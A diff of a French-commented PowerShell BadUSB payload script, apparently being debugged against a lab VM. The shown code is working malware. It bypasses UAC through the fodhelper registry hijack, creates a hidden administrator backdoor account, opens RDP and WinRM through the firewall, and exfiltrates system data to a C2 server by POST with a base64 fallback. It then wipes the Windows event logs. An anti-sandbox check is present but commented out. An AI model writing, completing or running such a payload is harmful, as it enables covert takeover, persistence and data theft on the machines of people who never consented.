@@ -1,21 +1,13 @@
 # ==============================================================
-# payload_final.ps1 – Charge utile BadUSB (version combinée)
+# payload_final.ps1 – Charge utile BadUSB (version corrigée)
 # 
-# Fonctionnalités :
-#   1. Anti-sandbox (détection VM/outils d'analyse)
-#   2. Élévation UAC automatique via fodhelper (sans interaction)
-#   3. Création compte administrateur aléatoire (svc_XXXXXX)
-#   4. Activation RDP et WinRM
-#   5. Exfiltration vers serveur C2 (POST /collect, fallback /b64)
-#   6. Nettoyage complet des traces (logs, historique, prefetch)
-#
-# Utilisation : exécuter en PowerShell (même utilisateur standard)
+# Utilisation : powershell -ExecutionPolicy Bypass -File .\payload_final.ps1
 # ==============================================================
 
 $ErrorActionPreference = "SilentlyContinue"
 
 # ──────────────────────────────────────────────────────────────
-# 1. ANTI‑SANDBOX (détection VMware/VirtualBox, outils analyse)
+# 1. ANTI‑SANDBOX (désactivé pour test – commenter pour production)
 # ──────────────────────────────────────────────────────────────
 
 function Test-Sandbox {
@@ -47,11 +39,13 @@ function Test-Sandbox {
     return $false
 }
 
-if (Test-Sandbox) { exit }
+# Désactivé pour les tests en VM
+# if (Test-Sandbox) { exit }
+
 Start-Sleep -Milliseconds 800
 
 # ──────────────────────────────────────────────────────────────
-# 2. CONTOURNEMENT UAC VIA FODHELPER (élève automatiquement)
+# 2. CONTOURNEMENT UAC VIA FODHELPER
 # ──────────────────────────────────────────────────────────────
 
 function Test-Admin {
@@ -61,27 +55,23 @@ function Test-Admin {
 }
 
 if (-not (Test-Admin)) {
-    # Récupère le chemin complet de ce script
+    Write-Host "[*] Pas de droits admin, élévation via fodhelper..."
     $selfPath = $MyInvocation.MyCommand.Path
     $elevCmd = "powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -NoProfile -File `"$selfPath`""
-    # Création de la clé registre pour fodhelper
     $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
     New-Item -Path $regPath -Force | Out-Null
     New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
     Set-ItemProperty -Path $regPath -Name "(default)" -Value $elevCmd -Force | Out-Null
-    # Déclenchement de fodhelper (s'élève silencieusement)
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
     Start-Sleep -Seconds 3
-    # Nettoyage de la clé temporaire
     Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
     exit
 }
 
-# À partir d'ici, le script tourne avec droits administrateur
 Write-Host "[+] Droits administrateur obtenus."
 
 # ──────────────────────────────────────────────────────────────
-# 3. CRÉATION DU COMPTE ADMINISTRATEUR CACHÉ (aléatoire)
+# 3. CRÉATION DU COMPTE ADMINISTRATEUR CACHÉ
 # ──────────────────────────────────────────────────────────────
 
 $charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
@@ -90,6 +80,7 @@ $backdoorUser = "svc_" + $suffix
 $pwChars = $charset + "!@#$%^&*()-_=+"
 $backdoorPass = -join ($pwChars.ToCharArray() | Get-Random -Count 18)
 
+Write-Host "[*] Création du compte $backdoorUser..."
 net user $backdoorUser $backdoorPass /add /expires:never /passwordreq:yes /comment:"Service Account" 2>&1 | Out-Null
 net localgroup Administrators $backdoorUser /add 2>&1 | Out-Null
 net localgroup "Remote Desktop Users" $backdoorUser /add 2>&1 | Out-Null
@@ -97,13 +88,13 @@ wmic useraccount where "Name='$backdoorUser'" set PasswordExpires=FALSE 2>&1 | O
 
 $loginHideKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 New-ItemProperty -Path $loginHideKey -Name $backdoorUser -Value 0 -PropertyType DWORD -Force 2>&1 | Out-Null
-
-Write-Host "[+] Compte administrateur masqué créé : $backdoorUser"
+Write-Host "[+] Compte $backdoorUser créé (mot de passe : $backdoorPass)"
 
 # ──────────────────────────────────────────────────────────────
-# 4. ACTIVATION ACCÈS DISTANT (RDP + WinRM)
+# 4. ACTIVATION RDP + WINRM
 # ──────────────────────────────────────────────────────────────
 
+Write-Host "[*] Activation RDP et WinRM..."
 Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -Force
 Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 -Force
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop" 2>&1 | Out-Null
@@ -114,12 +105,13 @@ Set-Service WinRM -StartupType Automatic 2>&1 | Out-Null
 Start-Service WinRM 2>&1 | Out-Null
 
 netsh advfirewall firewall add rule name="BackdoorRemoteAccess" protocol=TCP dir=in localport=3389,5985,5986 action=allow profile=any 2>&1 | Out-Null
-
 Write-Host "[+] RDP et WinRM activés."
 
 # ──────────────────────────────────────────────────────────────
-# 5. COLLECTE ET EXFILTRATION VERS SERVEUR C2 (IP à modifier)
+# 5. EXFILTRATION VERS SERVEUR C2 (endpoint corrigé)
 # ──────────────────────────────────────────────────────────────
+
+Write-Host "[*] Collecte des informations système..."
 
 $publicIP = "Inconnue"
 $ipServices = @("https://api.ipify.org","https://checkip.amazonaws.com","https://icanhazip.com")
@@ -148,30 +140,38 @@ $sysInfo = @{
 
 $jsonData = $sysInfo | ConvertTo-Json -Compress
 
-# --- Remplacer par l'IP de votre serveur C2 (Kali) ---
+# --- MODIFIEZ L'IP CI-DESSOUS SELON VOTRE KALI ---
 $c2Base = "http://10.10.1.32:8080"
 
-# Envoi principal (POST /collect)
+Write-Host "[*] Envoi des données au C2 ($c2Base/collect)..."
 $sent = $false
-try {
-    $resp = Invoke-WebRequest -Uri "$c2Base/collect" -Method POST -Body $jsonData -ContentType "application/json" -UseBasicParsing -TimeoutSec 8
-    if ($resp.StatusCode -eq 200) { $sent = $true }
-} catch {}
 
-# Fallback Base64 vers /b64
-if (-not $sent) {
-    try {
-        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($jsonData))
-        $null = Invoke-WebRequest -Uri "$c2Base/b64?d=$b64" -UseBasicParsing -TimeoutSec 8
-    } catch {}
+try {
+    $resp = Invoke-WebRequest -Uri "$c2Base/collect" -Method POST -Body $jsonData -ContentType "application/json" -UseBasicParsing -TimeoutSec 5
+    if ($resp.StatusCode -eq 200) {
+        $sent = $true
+        Write-Host "[+] Exfiltration POST /collect réussie."
+    }
+} catch {
+    Write-Host "[-] Échec POST /collect : $($_.Exception.Message)"
 }
 
-Write-Host "[+] Exfiltration tentée vers $c2Base"
+if (-not $sent) {
+    Write-Host "[*] Tentative fallback /b64..."
+    try {
+        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($jsonData))
+        $null = Invoke-WebRequest -Uri "$c2Base/b64?d=$b64" -UseBasicParsing -TimeoutSec 5
+        Write-Host "[+] Exfiltration de secours (/b64) réussie."
+    } catch {
+        Write-Host "[-] Échec total de l'exfiltration."
+    }
+}
 
 # ──────────────────────────────────────────────────────────────
 # 6. NETTOYAGE DES TRACES
 # ──────────────────────────────────────────────────────────────
 
+Write-Host "[*] Nettoyage des traces..."
 foreach ($log in @("System","Application","Security","Windows PowerShell","Microsoft-Windows-PowerShell/Operational")) {
     wevtutil cl "$log" 2>&1 | Out-Null
 }
